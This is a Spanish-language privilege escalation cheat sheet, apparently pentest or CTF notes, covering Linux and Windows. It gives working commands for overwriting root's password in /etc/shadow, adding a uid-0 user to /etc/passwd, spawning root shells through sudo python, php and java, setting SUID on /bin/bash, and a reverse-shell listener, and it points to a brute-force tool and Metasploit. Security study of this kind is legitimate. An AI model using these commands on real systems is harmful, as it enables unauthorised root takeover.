<h1 align="center">Escalada de privilegios</h1>

## **HERRAMIENTAS ÚTILES**

- **GTFOBins:** Un repositorio de técnicas de escalada de privilegios y ejecución de comandos utilizando binarios de Unix.

### **Comprobar Comandos Sudo**

`sudo -l`

### **Buscar Contraseñas en Archivos de Configuración**

`ls /var/www/html`
- Revistar archivos php y conf

### **Crontab**

Buscar en crontab archivos que se ejecuten como root y que podamos editar:

- `crontab -l`
- `ls /etc/cron\*`

**Enumerar Variables de Entorno**

El comando env muestra todas las variables de entorno de la shell. Podría incluir información sensible, como contraseñas:


### **Enumerar Información del Sistema**

Enumerar rutas interesantes:

`ls -lsaht /opt | /tmp | /var/tmp | /var/backups | /var/mail | /dev/shm`

Enumerar información del sistema para encontrar posibles vulnerabilidades:

- `uname -a`
- `cat /etc/\*-release`
- `file /bin/bash`

### **Permisos SUID**

Buscar archivos con permisos SUID:

`find / -perm /4000 2>/dev/null`

### **Buscar Archivos con Permisos de Escritura y lectura**

Buscar archivos y directorios que tienen permisos de escritura para todos los usuarios:

`find / -not -type l -perm -o+w 2>/dev/null`

###

### **Modificar /etc/shadow**

Si tienes permisos de escritura en /etc/shadow, puedes generar una nueva contraseña para root:

`openssl passwd -1 -salt abc password`

Reemplazar la entrada de root en /etc/shadow con la nueva contraseña.

### **Crear enlace simbólico**

Creando un enlace simbólico desde nuestro directorio de trabajo al de root:

`ln -s /root rooter`

Y ahora desde mi equipo intento leerla:

`curl <http://192.168.1.26:3333/jan/rooter/root.txt>`

### **Capabilities**

`/usr/sbin/getcap -r / 2>/dev/null`

Este comando recorrerá todos los archivos del sistema y mostrará sus capacidades, si las tienen. Se pueden explotar desde GTFObins en capabilities copiando en comando

### **Ver archivos con Nmap**

`nmap -iL \*ruta\*`

### **Ver si un archivo se esta ejecutando en el script de otro archivo (Tareas programadas)**

`grep -nri “/tmp/message” / 2>dev/null`

Busca de forma recursiva si en /usr hay algun script que mencione el archivo “/tmp/message”

### **Script para fuerza bruta al usuario root**

<https://github.com/d4t4s3c/suForce>

##

## **EJEMPLOS DE ESCALADA**

### **Escalada con Python**

Si tienes permisos de escritura en el script, edítalo para incluir una línea que proporcione una bash con privilegios de root.

- `import os`
- `os.system(“/bin/sh”)`

Si no puedes editar el script, puedes eliminarlo y crear uno nuevo con el mismo nombre, ejemplo:

<https://romabri.github.io/Library>

###

### **Escalada con grep y cut**

Si dispones de permisos como root en grep y cut haciendo sudo -l, puedes ver archivos que sólo root puede ver

### **Escalada con Java**

Si tienes permisos de root en Java:

1. Crear un archivo revershell.java que contenga la reverse shell.
2. Ejecutarlo con java como sudo

`sudo /usr/bin/java revershell.java`

1. Escuchar la conexión en la máquina local:

`nc -lvnp &lt;puerto&gt;`

### **Escalada con PHP**

Si puedes ejecutar PHP como otro usuario usando sudo, ejecuta el siguiente comando para abrir una terminal con el usuario indicado.

`sudo -u chocolate /usr/bin/php -r 'system("/bin/sh");`

![image](https://github.com/user-attachments/assets/29ead444-3a83-4584-ba0e-b824fe090d9e)


Si puedes ejecutar PHP como root, ejecuta el siguiente comando para conceder permisos SUID al bash. Cuando el bash se ejecute obtendrás una terminal con el usuario root

`echo '&lt;?php exec("chmod 4755 /bin/bash"); ?&gt;' > /opt/script.php`

##

### **Escalada con chown**

- `LFILE=/etc/passwd`
- `sudo chown $(id -un):$(id -gn) $LFILE`
- `openssl passwd hola123`
- `echo 'newroot:$1$EBhVbkUV$zW3uLFiknxfdzUV5OjQZ40:0:0::/home/newroot:/bin/bash' >> /etc/passwd`
- `su newroot`


## **AUTOMATIZAR ESCALADA EN WINDOWS**

### **PSPY64**

Es una herramienta diseñada para monitorear procesos y detectar configuraciones incorrectas que podrían permitir la escalada de privilegios en sistemas Windows.

<https://github.com/DominicBreuker/pspy>

### **LOCAL_EXPLOIT_SUGGESTER (metasploit)**

![image](https://github.com/user-attachments/assets/5deee4e3-d5bc-4d19-a563-2b4783a783a3)

Seleccionamos uno de ellos, en este caso ms16_014_wmi_recv_notif, rellenamos los campos y establecemos la sesion meterpreter con altos privilegios


También existe esta misma herramienta en github que contiene el manual de uso:

<https://github.com/AonCyberLabs/Windows-Exploit-Suggester>

### **PRIVESC CHECK**

Existe un script en PowerShell que enumera las credenciales de otros usuarios y posibles vías de escalada de privilegios.

Clonar repositorio:

<https://github.com/itm4n/PrivescCheck.git>

Transferir el repositorio clonado a la máquina Windows vulnerada y posicionarnos dentro de la carpeta clonada. Una vez ahí ejecutar el siguiente comando:

`powershell -ep bypass -c ". .\\PrivescCheck.ps1; Invoke-PrivescCheck"`

![image](https://github.com/user-attachments/assets/bfd3fdb0-ad3f-4423-afe3-306b1131bbd6)

## **AUTOMATIZAR ESCALADA EN LINUX**

### **LINPEAS**

Es una herramienta que busca en el sistema configuraciones incorrectas y vulnerabilidades que pueden permitir la escalada de privilegios.

<https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS>
